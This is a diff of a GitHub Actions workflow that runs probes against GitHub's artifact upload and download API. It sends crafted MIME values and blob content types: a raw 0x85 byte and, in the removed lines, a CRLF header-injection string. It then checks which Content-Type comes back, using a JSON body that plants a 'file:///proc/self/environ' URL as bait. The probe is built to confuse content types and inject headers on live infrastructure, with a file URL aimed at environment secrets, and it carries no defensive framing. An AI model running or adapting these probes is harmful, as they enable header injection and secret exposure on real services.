@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: deps
         run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
-      - name: mime pct probe
+      - name: omit-mime probe
         uses: actions/github-script@v7
         env:
           GITHUB_TOKEN: ${{ github.token }}
@@ -27,11 +27,9 @@ jobs:
             const repo = process.env.GITHUB_REPOSITORY;
             const stamp = process.env.GITHUB_RUN_ID;
             const sha = b => createHash('sha256').update(b).digest('hex');
-            const BODY = Buffer.from(JSON.stringify({
-              full_name: 'repo-cassette-pwn',
-              owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-              description: 'repo cassette', stargazers_count: 0,
-            }), 'utf8');
+            const BODY = Buffer.from(JSON.stringify({full_name:'x',owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}}),'utf8');
+            // single trailing 0x85 byte in the blob's own content type (latin1 -> raw byte on the wire)
+            const ODD = 'application/json\u0085';
             const req = (url, method='GET', body=null, headers={}) => new Promise((res, rej) => {
               const u = new URL(url);
               const r = https.request(u, {method, headers, timeout: 30000}, resp => {
@@ -42,15 +40,18 @@ jobs:
               if (body) r.write(body); r.end();
             });
             const ctHex = r => { const o=[]; for(let i=0;i<r.raw.length;i+=2) if(r.raw[i].toLowerCase()==='content-type') o.push(Buffer.from(r.raw[i+1],'latin1').toString('hex')); return o; };
-            async function run(label, mime) {
-              const name = `rc-p-${label}-${stamp}`;
-              const out = {label, mimeHex: Buffer.from(mime,'utf8').toString('hex')};
+            // mime === undefined -> omit the field entirely
+            async function run(label, version, mime) {
+              const name = `rc-o-${label}-${stamp}`;
+              const out = {label, version, mime: mime===undefined?'<omitted>':mime};
               try {
-                const created = await client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: mime})});
+                const cr = {workflowRunBackendId: ids.workflowRunBackendId, workflowJobRunBackendId: ids.workflowJobRunBackendId, name, version};
+                if (mime !== undefined) cr.mimeType = StringValue.create({value: mime});
+                const created = await client.CreateArtifact(cr);
                 out.createOk = !!created.ok;
                 if (!created.ok) throw new Error('CreateArtifact ok=false');
                 const up = created.signedUploadUrl;
-                out.put = (await req(up,'PUT',BODY,{'x-ms-blob-type':'BlockBlob','Content-Length':String(BODY.length)})).status;
+                out.put = (await req(up,'PUT',BODY,{'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':ODD,'Content-Length':String(BODY.length)})).status;
                 const fin = await client.FinalizeArtifact({...ids, name, size:String(BODY.length), hash:StringValue.create({value:`sha256:${sha(BODY)}`})});
                 out.finalizeOk = !!fin.ok;
                 if (!fin.ok) throw new Error('FinalizeArtifact ok=false');
@@ -61,23 +62,21 @@ jobs:
                 if (api.status===302 && api.headers.location) {
                   const loc = api.headers.location;
                   const m = /[?&]rsct=([^&]*)/.exec(loc);
+                  out.hasRsct = !!m;
                   out.rsctRaw = m ? m[1] : null;
-                  out.rsctDecodedHex = m ? Buffer.from(decodeURIComponent(m[1]),'latin1').toString('hex') : null;
-                  let fr;
-                  try { fr = await req(new URL(loc).href); out.finalStatus = fr.status; out.servedHex = ctHex(fr); out.bodyMatch = fr.body.equals(BODY); }
-                  catch(e) { out.fetchErr = String(e.code||e.message).slice(0,60); }
+                  const fr = await req(new URL(loc).href);
+                  out.finalStatus = fr.status;
+                  out.servedCtHex = ctHex(fr);   // ground truth
+                  out.bodyMatch = fr.body.equals(BODY);
                 }
-              } catch(e){ out.error = String(e.message||e).slice(0,200).replace(/https?:\/\/\S+/g,'[url]'); }
-              console.log('RCP ' + JSON.stringify(out));
+              } catch(e){ out.error = String(e.message||e).slice(0,180).replace(/https?:\/\/\S+/g,'[url]'); }
+              console.log('RCO ' + JSON.stringify(out));
             }
-            await run('ctl',        'application/json');
-            await run('pct85',      'application/json%85');
-            await run('pct2585',    'application/json%2585');
-            await run('lead85',     '%85application/json');
-            await run('pct1c',      'application/json%1C');
-            await run('pct0d0a',    'application/json%0D%0AX-Inject:1');
-            await run('pct09',      'application/json%09');
-            await run('pct20',      'application/json%20');
-            await run('param85',    'application/json;x=%85');
-            await run('comma85',    'application/json,%85');
-            console.log('RCP DONE');
+            // core hypothesis: version 6 + omitted mimeType => no rsct => blob CT (0x85) wins
+            await run('v6-nomime', 6, undefined);
+            await run('v0-nomime', 0, undefined);
+            await run('v7-nomime', 7, undefined);
+            // controls
+            await run('v6-zip-mime', 6, 'application/zip');
+            await run('v7-json-mime', 7, 'application/json');
+            console.log('RCO DONE');
